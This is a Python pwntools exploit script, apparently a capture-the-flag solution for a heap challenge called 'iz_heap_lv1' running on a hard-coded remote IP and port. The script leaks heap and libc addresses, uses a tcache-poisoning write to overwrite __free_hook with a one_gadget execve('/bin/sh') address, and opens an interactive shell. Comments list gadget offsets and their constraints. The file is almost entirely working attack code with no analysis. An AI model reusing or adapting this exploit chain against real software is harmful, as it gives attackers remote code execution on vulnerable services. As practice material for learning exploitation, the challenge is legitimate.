#!/usr/bin/python
from pwn import *

#s = process('./iz_heap_lv1', env={'LD_PRELOAD':'./libc.so.6'})
#s = process('./iz_heap_lv1')
# nc 165.22.110.249 3333
s = remote('165.22.110.249', 3333)

def add(size, data):
    s.sendlineafter('Choice: \n', '1')
    s.sendlineafter('size: ', str(size))
    s.sendlineafter('data: ', data)

def edit(index, size, data):
    s.sendlineafter('Choice: \n', '2')
    s.sendlineafter('index: ', str(index))
    s.sendlineafter('size: ', str(size))
    s.sendlineafter('data: ', data)

def delete(index):
    s.sendlineafter('Choice: \n', '3')
    s.sendlineafter('index: ', str(index))

def show_name(edit, name):
    s.sendlineafter('Choice: \n', '4')
    if edit == 'Y':
        s.sendlineafter('edit: (Y/N)', 'Y')
        s.sendlineafter('name: ', name)
    else:
        s.sendlineafter('edit: (Y/N)', 'N')
       


s.sendlineafter('name: ', 'a'*7)

edit(21, 8, 'b' * 8)
show_name('N','')
s.recvline()
heap_leak = u64(s.recvline()[-4:-1].ljust(8,'\x00'))
log.success('heap_leak = ' + hex(heap_leak))


show_name('Y', p64(heap_leak) * 2)
delete(20)
delete(21)

elf = ELF('./iz_heap_lv1')
atoi_got = elf.got['atoi']
log.success('atoi_got = ' + hex(atoi_got))

add(8, p64(atoi_got))
add(8, 'A' * 8)
add(8, 'B' * 8)
edit(20, 8, 'C' * 8)

show_name('N','')
libc_leak = s.recvline()[-7:-1]
libc_leak = u64(libc_leak.ljust(8, '\x00'))
log.success('libc_leak = ' + hex(libc_leak))
libc = ELF('./libc.so.6')
libc.address = libc_leak - 0x40680
log.success('libc = ' + hex(libc.address))

oneshot = libc.address + 0x4f322
hook = libc.symbols['__free_hook']
log.success('oneshot = ' + hex(oneshot))
log.success('free_hook = ' + hex(hook))

#show_name('Y', p64(heap_leak) * 2)
#delete(20)
edit(0, 0x20, 'B' * 0x20)
show_name('Y', p64(heap_leak + 0x20) * 2)
delete(20)
delete(21)
edit(0, 0x20, p64(hook))
add(0x20, 'D' * 8)
add(0x20, p64(oneshot))

#edit(20, 8, p64(atoi))
#edit(21, 8, 'A' * 8)
#edit(23, 8, 'B' * 8)
#edit(24, 8, 'C' * 8)

'''
gdb.attach(s, """
x/32gx 0x603200
python print('-------------')
x/32gx 0x602050
""")
'''

s.interactive()

'''
0x601fe0 atoi_got
0x603260 heap_leak

0x7ffff7a24680 libc_leak
0x7ffff79e4000 libc

offset = 0x7ffff7a24680 - 0x7ffff79e4000 = 0x40680

0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''

























